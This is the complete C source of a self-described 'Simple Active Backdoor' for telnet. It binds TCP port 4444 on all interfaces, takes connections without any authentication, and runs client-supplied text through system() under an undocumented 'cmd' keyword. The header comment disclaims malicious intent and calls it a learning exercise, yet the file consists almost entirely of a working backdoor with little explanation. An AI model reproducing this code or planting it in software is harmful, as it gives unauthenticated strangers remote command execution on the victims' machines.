/*

 ***************************************************

 * A simple backdoor for telnet.

 * by Philip Simonson

 ***************************************************

 * Do NOT use for malicious activity. This was

 * created simply to learn from. This isn't very

 * good, so I wouldn't recommend using for

 * "cracking".

 ***************************************************

 */



#if defined(_WIN32)

	#include <windows.h>

	#include <winsock2.h>

#else

	#include <sys/socket.h>

	#include <arpa/inet.h>

#endif



#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <errno.h>

#include <unistd.h>



#define MY_PORT 4444

#define VERSION_NUMBER "v0.02"



void handle_clients();



int main(argc,argv)

	int argc;

	char **argv;

{

	int serverfd;

	struct sockaddr_in server;

	char buf[BUFSIZ];

	char msg[BUFSIZ];



#if defined(_WIN32)

	WSADATA wsaData;

	ZeroMemory(&wsaData,sizeof(wsaData));

	if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0) {

		fprintf(stderr,"Error: Cannot startup winsock [ERROR CODE: %d]\n",WSAGetLastError());

		return 1;

	}

	ZeroMemory(buf,sizeof(buf));

	ZeroMemory(msg,sizeof(msg));

#endif



	errno = 0;

	if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {

		fprintf(stderr,"Error: %s\n",strerror(errno));

#if defined(_WIN32)

		WSACleanup();

#endif

		return -1;

	}



#if defined(_WIN32)

	ZeroMemory(&server,sizeof(server));

#else

	bzero(&server,sizeof(server));

	bzero(buf,sizeof(buf));

	bzero(msg,sizeof(msg));

#endif

	server.sin_family = AF_INET;

	server.sin_port = htons(MY_PORT);

	server.sin_addr.s_addr = htonl(INADDR_ANY);



	errno = 0;

	if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {

		fprintf(stderr,"Error: %s\n",strerror(errno));

#if defined(_WIN32)

		closesocket(serverfd);

		WSACleanup();

#else

		close(serverfd);

#endif

		return -1;

	}

	printf("%s bound to port [%d].\n",inet_ntoa(server.sin_addr),MY_PORT);



	errno = 0;

	if(listen(serverfd,1) < 0) {

		fprintf(stderr,"Error: %s\n",strerror(errno));

#if defined(_WIN32)

		closesocket(serverfd);

		WSACleanup();

#else

		close(serverfd);

#endif

		return -1;

	}



	while(1) {

		int clientfd;

		struct sockaddr_in client;

		int clientlen = sizeof(client);

		clientfd = accept(serverfd,(struct sockaddr*)&client,&clientlen);

		if(clientfd > 0) {

			printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),

				MY_PORT);

			memset(msg,0,sizeof(msg));

			sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);

			if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {

				puts("Couldn't send intro text.\n");

			}

			handle_clients(&clientfd);

#if defined(_WIN32)

			if(closesocket(clientfd) == 0) {

				printf("%s:%d client disconnected.\n",

					inet_ntoa(client.sin_addr),

					MY_PORT);

			}

#else

			if(close(clientfd) == 0) {

				printf("%s:%d client disconnected.\n",

					inet_ntoa(client.sin_addr),

					MY_PORT);

			}

#endif

		} else {

			puts("Cannot accept client connection.");

		}

	}



#if defined(_WIN32)

	closesocket(serverfd);

	WSACleanup();

#else

	close(serverfd);

#endif

	return 0;

}



void handle_clients(socket)

	int *socket;

{

	char msg[256];

	char buf[128];

	char cmd[128];

	int i;

	int c;



	do {

		memset(buf,0,sizeof(buf));

		memset(cmd,0,sizeof(cmd));

		send(*socket,"CMD >> ",7,0);

		for(i=0; i<sizeof(buf); ++i) {

			recv(*socket,&c,1,0);

			buf[i] = c;

			if(buf[i] == 0x0A || c == 0x0D) {

				break;

			}

		}

		sscanf(buf,"%[^\r]s",cmd);



		if(strcmp(cmd,"exit") == 0) {

			break;

		} else if(strcmp(cmd,"help") == 0) {

			memset(msg,0,sizeof(msg));

			sprintf(msg,"Commands: [exit,help]\r\n");

			send(*socket,msg,strlen(msg),0);

		} else if(strcmp(cmd,"cmd") == 0) {

			memset(buf,0,sizeof(buf));

			memset(cmd,0,sizeof(cmd));

			send(*socket,"Enter command: ",15,0);

			for(i=0; i<sizeof(buf); ++i) {

				recv(*socket,&c,1,0);

				buf[i] = c;

				if(buf[i] == 0x0A || c == 0x0D) {

					break;

				}

			}

			sscanf(buf,"%[^\r]s",cmd);

			system(cmd);

		} else {

			send(*socket,"Unknown command.\r\n",18,0);

		}

	} while(1);

}



